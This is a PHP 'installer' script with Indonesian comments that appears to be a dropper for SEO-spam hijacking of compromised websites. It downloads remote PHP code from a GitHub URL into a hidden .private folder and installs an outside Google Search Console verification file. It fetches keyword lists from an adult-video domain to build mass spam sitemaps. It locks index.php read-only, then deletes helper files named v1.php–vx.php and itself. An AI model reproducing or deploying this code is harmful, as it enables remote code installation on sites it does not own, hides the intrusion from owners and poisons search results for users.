<?php
date_default_timezone_set('Asia/Jakarta');
@set_time_limit(300); // 5 menit untuk semua operasi

// --- [KONFIGURASI DASAR] ---
$self_script_name = basename($_SERVER['PHP_SELF']);
$server_path = dirname(__FILE__);

// Logika domain
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off' || $_SERVER['SERVER_PORT'] == 443) ? "https://" : "http://";
$host = $_SERVER['HTTP_HOST'] ?? 'default-domain.com';
$clean_host = str_replace('www.', '', $host);
$full_domain_url = $protocol . $host; // Domain lengkap DENGAN www jika ada

// URL Download
$config_url = 'https://raw.githubusercontent.com/xshikata-ai/final/refs/heads/main/config.php'; 
$google_html_url = 'https://raw.githubusercontent.com/xshikata-ai/seo/refs/heads/main/google8f39414e57a5615a.html'; 
$keyword_url = 'https://player.javpornsub.net/keyword/default.txt'; 
$base_content_url_path = 'https://player.javpornsub.net/content/';

// Path Penyimpanan
$cache_dir = $server_path . '/.private';
$local_config_path = $cache_dir . '/config.php';
$local_json_content_path = $cache_dir . '/content.json'; 
$local_google_path = $server_path . '/google8f39414e57a5615a.html'; 
$local_robots_path = $server_path . '/robots.txt';
$local_sitemap_path = $server_path . '/sitemap.xml'; 

// --- [FUNGSI HELPER] ---

function fetchKeywordsFromUrl($url, $default = []) { 
    $content = false;
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    if ($content === false && function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
 
    if ($content !== false) {
        $lines = array_filter(array_map('trim', explode("\n", $content)), 'strlen');
        if (!empty($lines)) {
            return $lines;
        }
    }
    return $default;
}

function fetchRawUrl($url) {
    $content = false;
    if (ini_get('allow_url_fopen')) {
        $content = @file_get_contents($url);
    }
    if ($content === false && function_exists('curl_version')) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        $content = curl_exec($ch);
        curl_close($ch);
    }
    return $content;
}

function buat_robots_txt($domain) {
    global $local_robots_path;
    $sitemapUrl = 'https://' . $domain . '/sitemap.xml';
    $robotsContent = "User-agent: *\nAllow: /\n\nSitemap: $sitemapUrl\n";
    if (@file_put_contents($local_robots_path, $robotsContent)) {
        return true;
    }
    return false;
}

// --- [FUNGSI UTAMA] ---

/**
 * TAHAP 2: Dijalankan setelah form disubmit
 */
function jalankan_instalasi() {
    global $clean_host, $server_path, $self_script_name,
           $config_url, $local_config_path, $keyword_url, $base_content_url_path,
           $local_sitemap_path, $local_json_content_path, $protocol; // Ambil global protocol

    // 1. Ambil input dari form
    if (!isset($_GET['json_file']) || empty(trim($_GET['json_file']))) {
        header('Location: ' . $self_script_name);
        exit;
    }
    
    $json_filename = trim($_GET['json_file']);
    if (substr($json_filename, -5) !== '.json') $json_filename .= '.json';
    $derived_content_url = $base_content_url_path . $json_filename;
    
    $derived_keyword_url = $keyword_url; 

    $logs = [
        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Proses instalasi...']
    ];
    
    // 2. Unduh Konten JSON (Data)
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh JSON: ' . htmlspecialchars($derived_content_url)];
    $json_content = fetchRawUrl($derived_content_url);
    if ($json_content !== false && !empty($json_content)) {
        if (@file_put_contents($local_json_content_path, $json_content)) {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'JSON disimpan ke .private/content.json'];
        } else {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal simpan .private/content.json. Cek izin folder.'];
            tampilkan_log_terminal($logs, 'final_error'); return;
        }
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh JSON. Proses dibatalkan.'];
        tampilkan_log_terminal($logs, 'final_error'); return;
    }

    // 3. Unduh config.php (Logika)
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh config.php dari GitHub...'];
    $config_content = fetchRawUrl($config_url);
    if ($config_content !== false && !empty($config_content)) {
        if (@file_put_contents($local_config_path, $config_content)) {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'config.php disimpan.'];
        } else {
             $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal simpan config.php. Cek izin .private.'];
        }
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh config.php. Cek URL $config_url.'];
        tampilkan_log_terminal($logs, 'final_error'); return;
    }
    
    // 4. Buat robots.txt
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Buat robots.txt...'];
    if (buat_robots_txt($clean_host)) {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'robots.txt dibuat.'];
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal buat robots.txt.'];
    }
    
    // 5. Buat Sitemap
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh keywords (default.txt)...'];
    $keywords = fetchKeywordsFromUrl($derived_keyword_url, []);
    if (empty($keywords)) {
         $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh keywords. Sitemap tidak dibuat.'];
         tampilkan_log_terminal($logs, 'final_error'); return;
    }
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Found ' . count($keywords) . ' keywords. Buat sitemap...'];
    $total_keywords = count($keywords);
    $base_url = $protocol . $clean_host; // Perbaikan (Request 1)
    $now = date('Y-m-d\TH:i:s+07:00');
    $urls_per_map = 10000;
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Set batas ' . $urls_per_map . ' URL/sitemap.'];
    $num_maps = ceil($total_keywords / $urls_per_map);
    if ($num_maps == 0) $num_maps = 1;
    for ($i = 1; $i <= $num_maps; $i++) {
        $sitemap_file = 'sitemap-' . $i . '.xml';
        $sitemap_path_sub = $server_path . '/' . $sitemap_file;
        $offset = ($i - 1) * $urls_per_map;
        $keywords_chunk = array_slice($keywords, $offset, $urls_per_map);
        $xml_sub = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
        $xml_sub .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
        foreach ($keywords_chunk as $keyword) {
            $url = $base_url . '/index.php?id=' . htmlspecialchars(urlencode($keyword)); // Perbaikan (Request 1)
            $xml_sub .= '  <url><loc>' . $url . '</loc><lastmod>' . $now . '</lastmod></url>' . PHP_EOL;
        }
        $xml_sub .= '</urlset>' . PHP_EOL;
        @file_put_contents($sitemap_path_sub, $xml_sub);
    }
    $xml_index = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
    $xml_index .= '<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
    for ($i = 1; $i <= $num_maps; $i++) {
        $map_url = $base_url . '/sitemap-' . $i . '.xml'; // Perbaikan (Request 1)
        $xml_index .= '  <sitemap><loc>' . htmlspecialchars($map_url) . '</loc><lastmod>' . $now . '</lastmod></sitemap>' . PHP_EOL;
    }
    $xml_index .= '</sitemapindex>' . PHP_EOL;
    @file_put_contents($local_sitemap_path, $xml_index);
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => "Sitemap index & $num_maps sub-sitemap dibuat."];
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Instalasi Selesai.'];

    // 6. Chmod index.php
    $index_path = $server_path . '/index.php';
    if (@chmod($index_path, 0444)) {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'index.php -> 0444 (read-only).'];
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal chmod index.php. Lakukan manual.'];
    }

    // 7. Lanjut ke TAHAP 3 (Prompt Cek Redirect & Salin)
    tampilkan_prompt_cek_redirect($logs);
}

/**
 * TAHAP 1: Dijalankan saat loader.php dibuka
 */
function tampilkan_halaman_installer() {
    global $clean_host, $cache_dir, $google_html_url, $local_google_path, $self_script_name;

    $logs = [
        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Mulai...'],
        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Domain: ' . $clean_host]
    ];

    // 1. Buat folder .private
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Cek folder .private...'];
    if (!is_dir($cache_dir)) {
        if (!@mkdir($cache_dir, 0755, true)) {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'FATAL: Gagal buat .private. Cek izin.'];
            tampilkan_log_terminal($logs, 'final_error'); return;
        } else {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => '.private dibuat.'];
        }
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => '.private sudah ada.'];
    }

    // 2. Unduh Google HTML
    $google_file_name = basename($local_google_path);
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Unduh ' . $google_file_name . '...'];
    $google_content = fetchRawUrl($google_html_url);
    if ($google_content !== false && !empty($google_content)) {
        if (@file_put_contents($local_google_path, $google_content)) {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => $google_file_name . ' disimpan (untuk GSC).'];
        } else {
            $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal simpan ' . $google_file_name . '. Cek izin.'];
        }
    } else {
        $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'error', 'message' => 'Gagal unduh ' . $google_file_name . '.'];
    }

    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Siap. Menunggu input...'];

    // Tampilkan Terminal UI dengan log di atas, DAN form input
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Installer</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
        .input-form { margin-top: 20px; display: none; background: #1a1a1a; padding: 15px; border: 1px solid #333; }
        .input-form .form-group { margin-bottom: 12px; }
        .input-form label { display: block; margin-bottom: 8px; color: #0095ff; }
        .input-form input[type="text"] { width: 100%; padding: 10px; background: #222; border: 1px solid #444; color: #fff; font-family: inherit; font-size: 11px; box-sizing: border-box; }
        .input-form button { display: block; width: 100%; margin-top: 15px; padding: 10px; background: #28ca42; border: none; color: #000; font-weight: bold; cursor: pointer; font-family: inherit; font-size: 12px; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">system.installer</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
                
                <form method="GET" action="' . $self_script_name . '" class="input-form" id="jsonForm">
                    <input type="hidden" name="action" value="install">
                    <div class="form-group">
                        <label for="json_file">Masukkan Nama File JSON (untuk Konten):</label>
                        <input type="text" id="json_file" name="json_file" placeholder="contoh: english.json" required>
                    </div>
                    
                    <button type="submit">LANJUTKAN & BUAT SITEMAP</button>
                </form>
            </div>
        </div>
        <script>
            const installLogs = ' . json_encode($logs) . ';
            const container = document.getElementById("logsContainer");
            let currentLog = 0; let currentChar = 0; let currentLine = null;
            
            function typeNextChar() {
                if (currentLog >= installLogs.length) {
                    document.getElementById("jsonForm").style.display = "block";
                    document.getElementById("json_file").focus();
                    container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                    return;
                }
                
                const log = installLogs[currentLog];
                if (currentChar === 0) {
                    currentLine = document.createElement("div");
                    currentLine.className = "log-entry";
                    currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                    container.appendChild(currentLine);
                }
                const messageElement = currentLine.querySelector(".typing");
                if (currentChar < log.message.length) {
                    messageElement.textContent += log.message[currentChar];
                    currentChar++;
                    setTimeout(typeNextChar, 2); // Animasi cepat
                } else {
                    messageElement.classList.remove("typing");
                    currentChar = 0;
                    currentLog++;
                    setTimeout(typeNextChar, 10); // Jeda cepat
                }
            }
            setTimeout(typeNextChar, 100);
        </script>
    </body>
    </html>';
}

/**
 * TAHAP 3: Tampilkan log instalasi, tunggu Enter untuk Cek Redirect & Salin
 */
function tampilkan_prompt_cek_redirect($logs) {
    global $self_script_name, $full_domain_url;
    // URL untuk tes redirect
    $test_url = $full_domain_url . '/index.php?id=wanz-895-english-subtitle';
    
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Domain: ' . htmlspecialchars($full_domain_url)];
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER untuk:'];
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '1. Salin Domain'];
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '2. Cek Redirect (Tab Baru)'];
    $logs[] = ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => '3. Lanjut Hapus...'];

    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Cek Redirect & Salin Domain</title>
    <style>
        /* (CSS Terminal sama seperti sebelumnya) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">loader.php (Tahap 3 - Cek & Salin)</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
            </div>
        </div>
    <script>
        const logs = ' . json_encode($logs) . ';
        const container = document.getElementById("logsContainer");
        let currentLog = 0; let currentChar = 0; let currentLine = null;
        
        function typeNextChar() {
            if (currentLog >= logs.length) {
                container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                document.addEventListener("keydown", function(e) {
                    if (e.key === "Enter") {
                        e.preventDefault(); 
                        
                        // PERMINTAAN 2: Salin DULU, baru buka tab
                        try {
                            navigator.clipboard.writeText(\'' . $full_domain_url . '\').then(() => {
                                // Sukses copy, buka tab & redirect
                                window.open(\'' . $test_url . '\', \'_blank\');
                                window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
                            }).catch(err => {
                                // Gagal copy, tapi tetap lanjut
                                window.open(\'' . $test_url . '\', \'_blank\');
                                window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
                            });
                        } catch (err) {
                            // Gagal (misal http), tetap lanjut
                            window.open(\'' . $test_url . '\', \'_blank\');
                            window.location.href = \'' . $self_script_name . '?action=confirm_delete\';
                        }
                    }
                }, { once: true }); 
                return;
            }
            
            const log = logs[currentLog];
            if (currentChar === 0) {
                currentLine = document.createElement("div");
                currentLine.className = "log-entry";
                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                container.appendChild(currentLine);
            }
            const messageElement = currentLine.querySelector(".typing");
            if (currentChar < log.message.length) {
                messageElement.textContent += log.message[currentChar];
                currentChar++;
                setTimeout(typeNextChar, 2); // Animasi cepat
            } else {
                messageElement.classList.remove("typing");
                currentChar = 0;
                currentLog++;
                setTimeout(typeNextChar, 10); // Jeda cepat
            }
        }
        
        setTimeout(typeNextChar, 100); 
    </script>
    </body></html>';
}

/**
 * TAHAP 4: Tampilkan prompt konfirmasi HAPUS, tunggu Enter untuk HAPUS
 */
function tampilkan_prompt_hapus() {
    global $self_script_name;
    // Log untuk TAHAP 4
    $logs = [
        ['timestamp' => date('H:i:s'), 'type' => 'success', 'message' => 'Domain disalin ke clipboard!'],
        ['timestamp' => date('H:i:s'), 'type' => 'warning', 'message' => 'PERINGATAN: Pastikan GSC sudah diverifikasi!'],
        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'File installer akan dihapus permanen.'],
        ['timestamp' => date('H:i:s'), 'type' => 'info', 'message' => 'Tekan ENTER UNTUK HAPUS.']
    ];

    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Konfirmasi Hapus</title>
    <style>
        /* (CSS Terminal sama seperti sebelumnya) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">loader.php (Tahap 4 - Konfirmasi Hapus)</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
            </div>
        </div>
    <script>
        const logs = ' . json_encode($logs) . ';
        const container = document.getElementById("logsContainer");
        let currentLog = 0; let currentChar = 0; let currentLine = null;
        
        function typeNextChar() {
            if (currentLog >= logs.length) {
                container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                document.addEventListener("keydown", function(e) {
                    if (e.key === "Enter") {
                        e.preventDefault(); 
                        window.location.href = \'' . $self_script_name . '?action=cleanup\';
                    }
                }, { once: true }); 
                return;
            }
            
            const log = logs[currentLog];
            if (currentChar === 0) {
                currentLine = document.createElement("div");
                currentLine.className = "log-entry";
                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                container.appendChild(currentLine);
            }
            const messageElement = currentLine.querySelector(".typing");
            if (currentChar < log.message.length) {
                messageElement.textContent += log.message[currentChar];
                currentChar++;
                setTimeout(typeNextChar, 2); // Animasi cepat
            } else {
                messageElement.classList.remove("typing");
                currentChar = 0;
                currentLog++;
                setTimeout(typeNextChar, 10); // Jeda cepat
            }
        }
        
        setTimeout(typeNextChar, 100); 
    </script>
    </body></html>';
}


/**
 * TAHAP 5: Hapus file dan hapus diri sendiri
 */
function jalankan_penghapusan_terakhir() {
    global $server_path, $self_script_name, $full_domain_url;
    
    // Daftar file yang akan dihapus
    $files_to_delete = [
        'v1.php', 'v2.php', 'v3.php', 'v4.php', 'v5.php', 'vx.php',
        'google8f39414e57a5615a.html'
    ];

    // Kirim JavaScript redirect ke browser SEBELUM menghapus file
    echo "<!DOCTYPE html><html><head><title>Pembersihan Selesai</title></head><body>";
    echo "<p>Pembersihan selesai. Mengalihkan ke halaman utama...</p>";
    echo "<script>window.location.href = '" . $full_domain_url . "';</script>"; // Redirect ke root domain
    echo "</body></html>";
    
    // Pastikan output terkirim ke browser sebelum lanjut
    if (function_exists('fastcgi_finish_request')) {
        fastcgi_finish_request();
    } else {
        @ob_flush();
        @flush();
    }

    // Hapus file-file installer
    foreach ($files_to_delete as $filename) {
        $file_path = $server_path . '/' . $filename;
        if (file_exists($file_path)) {
            @unlink($file_path);
        }
    }

    // Hapus diri sendiri
    @unlink(__FILE__);
}

/**
 * Fungsi untuk menampilkan UI Terminal dengan log jika ada error fatal
 */
function tampilkan_log_terminal($logs, $next_action = 'done') {
    echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Processing...</title>
    <style>
        /* (CSS Terminal sama seperti sebelumnya) */
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: "SF Mono", Monaco, "Cascadia Code", "Roboto Mono", Consolas, "Courier New", monospace; background: #000; color: #fff; min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 10px; }
        .terminal { max-width: 800px; width: 100%; background: #111; border: 1px solid #333; padding: 0; }
        .terminal-header { padding: 15px 20px; border-bottom: 1px solid #333; display: flex; align-items: center; gap: 8px; }
        .terminal-dot { width: 10px; height: 10px; border-radius: 50%; }
        .red { background: #ff5f57; } .yellow { background: #ffbd2e; } .green { background: #28ca42; }
        .terminal-content { padding: 20px; font-size: 11px; line-height: 1.4; }
        .log-entry { margin-bottom: 10px; display: flex; align-items: flex-start; gap: 8px; }
        .timestamp { color: #666; min-width: 70px; font-size: 10px; }
        .log-success { color: #28ca42; } .log-error { color: #ff5f57; } .log-warning { color: #ffbd2e; } .log-info { color: #0095ff; }
        .typing { border-right: 1px solid #fff; animation: blink 1s infinite; }
        @keyframes blink { 0%, 50% { border-color: #fff; } 51%, 100% { border-color: transparent; } }
        .command-line { display: flex; align-items: center; gap: 6px; margin-top: 15px; }
        .prompt { color: #28ca42; font-size: 11px; }
        .cursor { background: #fff; width: 6px; height: 12px; animation: blink 1s infinite; }
    </style>
    </head>
    <body>
        <div class="terminal">
            <div class="terminal-header">
                <div class="terminal-dot red"></div><div class="terminal-dot yellow"></div><div class="terminal-dot green"></div>
                <div style="color: #666; font-size: 10px;">loader.php (Site Installer)</div>
            </div>
            <div class="terminal-content" id="terminalContent">
                <div id="logsContainer"></div>
            </div>
        </div>
    <script>
        const logs = ' . json_encode($logs) . ';
        const container = document.getElementById("logsContainer");
        let currentLog = 0; let currentChar = 0; let currentLine = null;

        function typeNextChar() {
            if (currentLog >= logs.length) {
                container.innerHTML += \'<div class="command-line"><span class="prompt">$</span><span class="cursor"></span></div>\';
                return;
            }
            
            const log = logs[currentLog];
            if (currentChar === 0) {
                currentLine = document.createElement("div");
                currentLine.className = "log-entry";
                currentLine.innerHTML = \'<span class="timestamp">\' + log.timestamp + \'</span><span class="log-\' + log.type + \' typing"></span>\';
                container.appendChild(currentLine);
            }
            
            const messageElement = currentLine.querySelector(".typing");
            if (currentChar < log.message.length) {
                messageElement.textContent += log.message[currentChar];
                currentChar++;
                setTimeout(typeNextChar, 2); // Animasi cepat
            } else {
                messageElement.classList.remove("typing");
                currentChar = 0;
                currentLog++;
                setTimeout(typeNextChar, 10); // Jeda cepat
            }
        }
        setTimeout(typeNextChar, 100);
    </script>
    </body></html>';
}


// --- [ROUTER UTAMA] ---

// TAHAP 5 (Final): User menekan Enter di TAHAP 4. Ini adalah aksi terakhir.
if (isset($_GET['action']) && $_GET['action'] === 'cleanup') {
    jalankan_penghapusan_terakhir();
    exit;
}

// TAHAP 4: User menekan Enter di TAHAP 3.
if (isset($_GET['action']) && $_GET['action'] === 'confirm_delete') {
    tampilkan_prompt_hapus();
    exit;
}

// TAHAP 2: User menekan "LANJUTKAN" di form.
if (isset($_GET['action']) && $_GET['action'] === 'install') {
    jalankan_instalasi(); // Fungsi ini sekarang mengarah ke TAHAP 3
    exit;
} 

// TAHAP 1: User membuka loader.php pertama kali.
else {
    tampilkan_halaman_installer();
    exit;
}
?>
